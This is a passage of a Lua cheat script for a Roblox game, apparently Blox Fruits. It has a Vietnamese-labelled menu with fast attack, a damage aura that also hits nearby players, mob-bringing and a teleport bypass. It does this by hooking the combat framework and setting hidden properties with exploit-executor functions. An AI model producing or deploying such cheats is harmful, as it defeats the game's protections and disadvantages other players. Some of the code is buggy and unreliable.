        game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end) 

local PlayerName = game.Players.LocalPlayer.DisplayName
require(game.ReplicatedStorage.Notification).new("<Color=Blue>" ..PlayerName.. "<Color=/>"):Display()


--//Code
setfpscap(60)
--//macdinh
local UwU = CFrame.new(-9506.234375, 172.130615234375, 6117.0771484375)
local CakePos = CFrame.new(-1978.45715, 251.535294, -12395.2979)
local JackBoCon = CFrame.new(-7748.0185546875, 5606.80615234375, -2305.898681640625)
local BuCacCho = CFrame.new(-5344.822265625, 423.98541259766, -2725.0930175781)
local LongMa = CFrame.new(-10238.875976563, 389.7912902832, -9549.7939453125)

local realbhit = require(game.ReplicatedStorage.CombatFramework.RigLib)
local cooldownfastattack = tick()
local plr = game.Players.LocalPlayer

local Players = game:GetService("Players")
local playerCount = #game:GetService("Players"):GetPlayers()

local placeId = game.PlaceId
local jobId = game.JobId

local CheckLuOcCho = #game:GetService("Players"):GetPlayers()

_G.BringMode = 300
PosY = 45
AutoHaki()

spawn(function()
	function DuckHub()
		game:GetService("VirtualUser"):CaptureController()
		game:GetService("VirtualUser"):Button1Down(Vector2.new(1280, 672))
	end
end)

function StopTween(target)
        if not target then
        _G.StopTween = true
        wait()
        topos(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
        wait()
        if game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
        end
        _G.StopTween = false
        _G.Clip = false
        end
        end

function GetDistance(q)
    if type(q) == "instance" then
        if Instance:IsA("BasePart") or Instance:IsA("Part") then
            return (q.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        elseif Instance:FindFirstChild("HumanoidRootPart") then
            return (q.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        else
            for r, v in pairs(q:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("Part") then
                    return (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                end
            end
        end
    else
        return (q - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    end
end

---------------SettingTab
Tabs.infor:AddSection("Nhóm Discord")
Tabs.infor:AddButton({
        Title = "Tham Gia Nhóm | Duck Community",
        Description = "https://discord.gg/czQf9Hr5mW | Copy Link",
        Callback = function()
        setclipboard("https://discord.gg/czQf9Hr5mW | Copy Link")
        end
    })
---------------TabStatus
local Katakuri = Tabs.Home:AddParagraph({
    Title = "Status: Boss Katakuri",
    Content = ""
})

spawn(
function()
	while wait() do
		pcall(  
		function()
			if string.len(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 88 then
				Katakuri:SetDesc("Quát Vật Còn Lại: "..string.sub(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,41).."")
			elseif string.len(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 87 then
				Katakuri:SetDesc("Kill : "..string.sub(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,40).."")
			elseif string.len(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 86 then
				Katakuri:SetDesc("Kill : "..string.sub(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,39).." ")
			else
				Katakuri:SetDesc("Status 🟢:Katakuri Spawm")
			end
		end
		)
	end
end
)
local FUllmoon = Tabs.Home:AddParagraph({
        Title = "Status: Moon",
        Content = ""
    })
    spawn(
            function()
                        while task.wait() do
              pcall(  
                    function()
             if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
                        FUllmoonc:SetDesc("100%")
                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
                        FUllmoon:SetDesc("75%")
                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709143733" then
                        FUllmoon:SetDesc("50%")
                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709150401" then
                        FUllmoon:SetDesc("25%")
                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149680" then
                        FUllmoon:SetDesc("15%")
                    else
                        FUllmoon:SetDesc("0%")
end
end
)
end
end
)
local Elite = Tabs.Home:AddParagraph({
    Title = "Status: Boss Elite Hunter",
    Content = ""
})
spawn(
        function()
    while wait() do
        spawn(
                function()
            if game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") 
            or game:GetService("ReplicatedStorage"):FindFirstChild("Deandre") 
            or game:GetService("ReplicatedStorage"):FindFirstChild("Urban") 
            or game:GetService("Workspace").Enemies:FindFirstChild("Diablo") 
            or game:GetService("Workspace").Enemies:FindFirstChild("Deandre") 
            or game:GetService("Workspace").Enemies:FindFirstChild("Urban") then
                Elite:SetDesc("Status 🟢: Đang Có Boss")	
            else
                Elite:SetDesc("Status 🔴: Không Có Boss")	
            end
        end
        )
    end
end
)
local Mirage = Tabs.Home:AddParagraph({
    Title = "Status: Mirage",
    Content = ""
})

local function updateMirageStatus()
    local mirageIsland = game.Workspace._WorldOrigin.Locations:FindFirstChild('Đảo Kì Bí')
    if mirageIsland then
        Mirage:SetDesc('Status 🟢: Mirage on')
    else
        Mirage:SetDesc('Status 🔴: Mirage off')
    end
end

spawn(function()
    while wait(1) do
        pcall(updateMirageStatus)
    end
end
)
StatusKitsune = Tabs.Home:AddParagraph({
    Title = "Kistune Island",
    Content = ""
})
function UpdateKitsune()
    if game.Workspace._WorldOrigin.Locations:FindFirstChild('Kitsune Island') then
        StatusKitsune:SetDesc("Kitsune Island : 🟢")
    else
        StatusKitsune:SetDesc("Kitsune Island : 🔴")
    end
end
spawn(function()
    pcall(function()
        while wait() do
            UpdateKitsune()
        end
    end)
end)



local Mastery = Tabs.Home:AddSection("Join Server")
local Input = Tabs.Home:AddInput("Input", {
        Title = "Job Id",
        Default = "",
        Placeholder = "",
        Numeric = false, 
        Finished = false,
        Callback = function(TaiViSaoEmRoiXaAnhViAnhNgheoHaySao)
        UwUvui = TaiViSaoEmRoiXaAnhViAnhNgheoHaySao
        end
    })
Tabs.Home:AddButton({
    Title = "Join Server",
    Description = "Wait Join",
    Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.placeId,UwUvui, game.Players.LocalPlayer)
    end
})
------//Farm Ming Di Cac Ban Oi
----//Tab Main Nhe Cac Ban Chu May Tab Kia Met Nhoc Lam Buoc Dau Se La Fast Attack Nha, Roi Sau Do Den Bring Mob
if not LPH_OBFUSCATED then
	LPH_JIT_MAX = (function(...) return ... end)
	LPH_NO_VIRTUALIZE = (function(...) return ... end)
	LPH_NO_UPVALUES = (function(...) return ... end)
end

NoAttackAnimation = true
local DmgAttack = game:GetService("ReplicatedStorage").Assets.GUI:WaitForChild("DamageCounter")
local PC = require(game.Players.LocalPlayer.PlayerScripts.CombatFramework.Particle)
local RL = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib)
local oldRL = RL.wrapAttackAnimationAsync
RL.wrapAttackAnimationAsync = function(a,b,c,d,func)
	if not NoAttackAnimation then
		return oldRL(a,b,c,60,func)
	end

	local Hits = {}
	local Client = game.Players.LocalPlayer
	local Characters = game:GetService("Workspace").Characters:GetChildren()
	for i,v in pairs(Characters) do
		local Human = v:FindFirstChildOfClass("Humanoid")
		if v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < 65 then
			table.insert(Hits,Human.RootPart)
		end
	end
	local Enemies = game:GetService("Workspace").Enemies:GetChildren()
	for i,v in pairs(Enemies) do
		local Human = v:FindFirstChildOfClass("Humanoid")
		if Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < 65 then
			table.insert(Hits,Human.RootPart)
		end
	end
	a:Play(0.01,0.01,0.01)
	pcall(func,Hits)
end

getAllBladeHits = LPH_NO_VIRTUALIZE(function(Sizes)
	local Hits = {}
	local Client = game.Players.LocalPlayer
	local Enemies = game:GetService("Workspace").Enemies:GetChildren()
	for i,v in pairs(Enemies) do
		local Human = v:FindFirstChildOfClass("Humanoid")
		if Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes+5 then
			table.insert(Hits,Human.RootPart)
		end
	end
	return Hits
end)

getAllBladeHitsPlayers = LPH_NO_VIRTUALIZE(function(Sizes)
	local Hits = {}
	local Client = game.Players.LocalPlayer
	local Characters = game:GetService("Workspace").Characters:GetChildren()
	for i,v in pairs(Characters) do
		local Human = v:FindFirstChildOfClass("Humanoid")
		if v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes+5 then
			table.insert(Hits,Human.RootPart)
		end
	end
	return Hits
end)

local CombatFramework = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
local CombatFrameworkR = getupvalues(CombatFramework)[2]
local RigEven = game:GetService("ReplicatedStorage").RigControllerEvent
local AttackAnim = Instance.new("Animation")
local AttackCoolDown = 0
local cooldowntickFire = 0
local MaxFire = 1000
local FireCooldown = 0.06
local FireL = 0
local bladehit = {}

CancelCoolDown = LPH_JIT_MAX(function()
	local ac = CombatFrameworkR.activeController
	if ac and ac.equipped then
		AttackCoolDown = tick() + (FireCooldown or 0.01) + ((FireL/MaxFire)*0.3)
		RigEven.FireServer(RigEven,"weaponChange",ac.currentWeaponModel.Name)
		FireL = FireL + 1
		fask.delay((FireCooldown or 0.01) + ((FireL+0.3/MaxFire)*0.3),function()
			FireL = FireL - 1
		end)
	end
end)

AttackFunction = LPH_JIT_MAX(function(typef)
	local ac = CombatFrameworkR.activeController
	if ac and ac.equipped then
		local bladehit = {}
		if typef == 1 then
			bladehit = getAllBladeHits(60)
		elseif typef == 2 then
			bladehit = getAllBladeHitsPlayers(65)
		else
			for i2,v2 in pairs(getAllBladeHits(55)) do
				table.insert(bladehit,v2)
			end
			for i3,v3 in pairs(getAllBladeHitsPlayers(55)) do
				table.insert(bladehit,v3)
			end
		end
		if #bladehit > 0 then
			pcall(fask.spawn,ac.attack,ac)
			if tick() > AttackCoolDown then
				CancelCoolDown()
			end
			if tick() - cooldowntickFire > 0.3 then
				ac.timeToNextAttack = 0
				ac.hitboxMagnitude = 60
				pcall(fask.spawn,ac.attack,ac)
				cooldowntickFire = tick()
			end
			local AMI3 = ac.anims.basic[3]
			local AMI2 = ac.anims.basic[2]
			local REALID = AMI3 or AMI2
			AttackAnim.AnimationId = REALID
			local StartP = ac.humanoid:LoadAnimation(AttackAnim)
			StartP:Play(0.01,0.01,0.01)
			RigEven.FireServer(RigEven,"hit",bladehit,AMI3 and 3 or 2,"")
			fask.delay(0.01,function()
				StartP:Stop()
			end)
		end
	end
end)

function CheckStun()
	if game:GetService('Players').LocalPlayer.Character:FindFirstChild("Stun") then
		return game:GetService('Players').LocalPlayer.Character.Stun.Value ~= 0
	end
	return false
end

LPH_JIT_MAX(function()
	spawn(function()
		while game:GetService("RunService").Stepped:Wait() do
			local ac = CombatFrameworkR.activeController
			if ac and ac.equipped and not CheckStun() then
				if NeedAttacking and Fast_Attack then
					fask.spawn(function()
						pcall(fask.spawn,AttackFunction,1)
					end)
				elseif DamageAura then
					fask.spawn(function()
						pcall(fask.spawn,AttackFunction,3)
					end)
				elseif UsefastattackPlayers and Fast_Attack then
					fask.spawn(function()
						pcall(fask.spawn,AttackFunction,2)
					end)
				elseif NeedAttacking and Fast_Attack == false then
					if ac.hitboxMagnitude ~= 55 then
						ac.hitboxMagnitude = 55
					end
					pcall(fask.spawn,ac.attack,ac)
				end
			end
		end
	end)
end)()

local Section = Tabs.Main:AddSection("Main Setup Setting Farm")

Tabs.Main:AddButton({
    Title = "Siêu Pro Fix Lag | Booster",
    Description = "Giảm Đồ Họa Thấp",
    Callback = function()
        local function FPSBooster()
            local decalsyeeted = true
            local g = game
            local w = g.Workspace
            local l = g.Lighting
            local t = w.Terrain
            
            sethiddenproperty(l, "Technology", Enum.Technology.Compatibility)
            sethiddenproperty(t, "Decoration", false)
            
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
            t.WaterReflectance = 0
            t.WaterTransparency = 0
            
            l.GlobalShadows = false
            l.FogEnd = 9e9
            l.Brightness = 0
            
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
            
            for _, v in pairs(g:GetDescendants()) do
                if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
                    v.Material = Enum.Material.Plastic
                    v.Reflectance = 0
                elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
                    v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Lifetime = NumberRange.new(0)
                elseif v:IsA("Explosion") then
                    v.BlastPressure = 1
                    v.BlastRadius = 1
                elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                    v.Enabled = false
                elseif v:IsA("MeshPart") then
                    v.Material = Enum.Material.Plastic
                    v.Reflectance = 0
                    v.TextureID = 10385902758728957 -- You might want to verify this TextureID
                end
            end
            
            for _, e in pairs(l:GetChildren()) do
                if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                    e.Enabled = false
                end
            end
        end
        
        FPSBooster()
    end
})
local FASTAT = Tabs.Main:AddToggle("Fast_Attack", {Title = "Fast Attack", Default = true })
FASTAT:OnChanged(function(value)
	Fast_Attack = value
	DamageAura = value
	ClickNoCooldown = value
	DmgAttack.Enabled = not value	
end)

local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
Mouse.Button1Down:Connect(function()
	if ClickNoCooldown then
		local ac = CombatFrameworkR.activeController

		if ac and ac.equipped then
			ac.hitboxMagnitude = 55
			pcall(AttackFunction,2)
		end
	end
end)

---//Bring Mob o Tren Fast Attack Nhin On Khong Ta
local Toggle = Tabs.Main:AddToggle("Bring Mob", { Title = "Bring Mob", Default = true })
Toggle:OnChanged(function(Value)
    _G.BringMonster = Value
end)

spawn(function()
	while task.wait() do
		pcall(function()
            CheckQuest()
			for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
				if _G.BringMonster then
					if StartBring and v.Name == MonFarm or v.Name == Mon and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= _G.BringMode then
						if v.Name == "Factory Staff" then
							if (v.HumanoidRootPart.Position - PosMon.Position).Magnitude <= 5000 then
								v.Head.CanCollide = false
								v.HumanoidRootPart.CanCollide = false
								v.HumanoidRootPart.CFrame = PosMon
								if v.Humanoid:FindFirstChild("Animator") then
									v.Humanoid.Animator:Destroy()
								end
								sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
							end
						elseif v.Name == MonFarm or v.Name == Mon then
							if (v.HumanoidRootPart.Position - PosMon.Position).Magnitude <= 4500 then
                                v.HumanoidRootPart.CFrame = PosMon
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
							end
						end
					end
				end
			end
		end)
	end
end)
        spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.BringMonster then
                        CheckQuest()
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if _G.AutoFarm and StartMagnet and v.Name == Mon and (Mon == "Factory Staff" or Mon == "Monkey" or Mon == "Dragon Crew Warrior" or Mon == "Dragon Crew Archer") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 220 then
                                v.HumanoidRootPart.CFrame = PosMon
                                v.Humanoid:ChangeState(14)
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                            elseif _G.AutoFarm and StartMagnet and v.Name == Mon and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= _G.BringMode then
                                v.HumanoidRootPart.CFrame = PosMon
                                v.Humanoid:ChangeState(14)
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                            end
                        end
                    end
                end)
            end
        end)
        spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.BringMonster then
                        CheckQuest()
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if _G.AutoFarm and StartMagnet and v.Name == Mon and (Mon == "Factory Staff" or Mon == "Monkey" or Mon == "Dragon Crew Warrior" or Mon == "Dragon Crew Archer") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 250 then
                                v.HumanoidRootPart.CFrame = PosMon
                                v.Humanoid:ChangeState(14)
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                            elseif _G.AutoFarm and StartMagnet and v.Name == Mon and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= _G.BringMode then
                                v.HumanoidRootPart.CFrame = PosMon
                                v.Humanoid:ChangeState(14)
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                            end
                            if Auto_Ki_Di and StartEctoplasmMagnet then
                            if string.find(v.Name, "Ship") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - EctoplasmMon.Position).Magnitude <= _G.BringMode then
                                v.HumanoidRootPart.CFrame = EctoplasmMon
                                v.Humanoid:ChangeState(14)
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                            end
                         end                                                       
                          if _G.Kiem_Lua and StartRengokuMagnet then
                                if (v.Name == "Snow Lurker" or v.Name == "Arctic Warrior") and (v.HumanoidRootPart.Position - RengokuMon.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    v.Humanoid:ChangeState(14)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    v.HumanoidRootPart.CFrame = RengokuMon
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                            if _G.AutoMusketeerHat and StartMagnetMusketeerhat then
                                if v.Name == "Forest Pirate" and (v.HumanoidRootPart.Position - MusketeerHatMon.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    v.Humanoid:ChangeState(14)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    v.HumanoidRootPart.CFrame = MusketeerHatMon
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                            if _G.AutoObservationHakiV2 and Mangnetcitzenmon then
                                if v.Name == "Forest Pirate" and (v.HumanoidRootPart.Position - MusketeerHatMon.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    v.Humanoid:ChangeState(14)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    v.HumanoidRootPart.CFrame = PosHee
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                            if _G.Auto_EvoRace and StartEvoMagnet then
                                if v.Name == "Zombie" and (v.HumanoidRootPart.Position - PosMonEvo.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    v.Humanoid:ChangeState(14)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    v.HumanoidRootPart.CFrame = PosMonEvo
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                            if _G.AutoBartilo and AutoBartiloBring then
                                if v.Name == "Swan Pirate" and (v.HumanoidRootPart.Position - PosMonBarto.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    v.Humanoid:ChangeState(14)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    v.HumanoidRootPart.CFrame = PosMonBarto
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                            if _G.AutoFarmFruitMastery and StartMasteryFruitMagnet then
                                if v.Name == "Monkey" then
                                    if (v.HumanoidRootPart.Position - PosMonMasteryFruit.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        v.HumanoidRootPart.CFrame = PosMonMasteryFruit
                                        if v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                        sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                    end
                                elseif v.Name == "Factory Staff" then
                                    if (v.HumanoidRootPart.Position - PosMonMasteryFruit.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        v.HumanoidRootPart.CFrame = PosMonMasteryFruit
                                        if v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                        sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                    end
                                elseif v.Name == Mon then
                                    if (v.HumanoidRootPart.Position - PosMonMasteryFruit.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        v.HumanoidRootPart.CFrame = PosMonMasteryFruit
                                        if v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                        sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                    end
                                end
                            end
                            if _G.AutoFarm and StartMagnetBoneMon then
                                if (v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy") and (v.HumanoidRootPart.Position - PosMonBone.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    v.Humanoid:ChangeState(14)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    v.HumanoidRootPart.CFrame = PosMonBone
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                            if _G.Quest_Nhu_Cai_Lon and StartMagnetBoneMon then
                                if (v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy") and (v.HumanoidRootPart.Position - PosMonBone.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    v.Humanoid:ChangeState(14)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    v.HumanoidRootPart.CFrame = PosMonBone
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                            if _G.AutoFarmGunMastery and StartMasteryGunMagnet then
                                if v.Name == "Monkey" then
                                    if (v.HumanoidRootPart.Position - PosMonMasteryGun.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        v.HumanoidRootPart.CFrame = PosMonMasteryGun
                                        if v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                        sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                    end
                                elseif v.Name == "Factory Staff" then
                                    if (v.HumanoidRootPart.Position - PosMonMasteryGun.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        v.HumanoidRootPart.CFrame = PosMonMasteryGun
                                        if v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                        sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                    end
                                elseif v.Name == Mon then
                                    if (v.HumanoidRootPart.Position - PosMonMasteryGun.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        v.HumanoidRootPart.CFrame = PosMonMasteryGun
                                        if v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                        sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                    end
                                end
                            end                     
                            if _G.AutoFarm and MagnetDought then
                                if (v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker") and (v.HumanoidRootPart.Position - PosMonDoughtOpenDoor.Position).Magnitude <= _G.BringMode and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then                                    
                                    v.Humanoid:ChangeState(10)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    v.HumanoidRootPart.CFrame = PosMonDoughtOpenDoor
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                        end
                    end
                end)
             end
    end)
    
task.spawn(function()
while true do wait()
if setscriptable then
setscriptable(game.Players.LocalPlayer, "SimulationRadius", true)
end
if sethiddenproperty then
sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
end
end
end)
--//ConCacDiMeChungMay
local Toggle = Tabs.Main:AddToggle("Bypass TP", { Title = "Bypass TP", Default = true })
Toggle:OnChanged(function(Value)
    BypassTP = Value
end)

---//Farm
local Section = Tabs.Main:AddSection("Main Auto Farm")
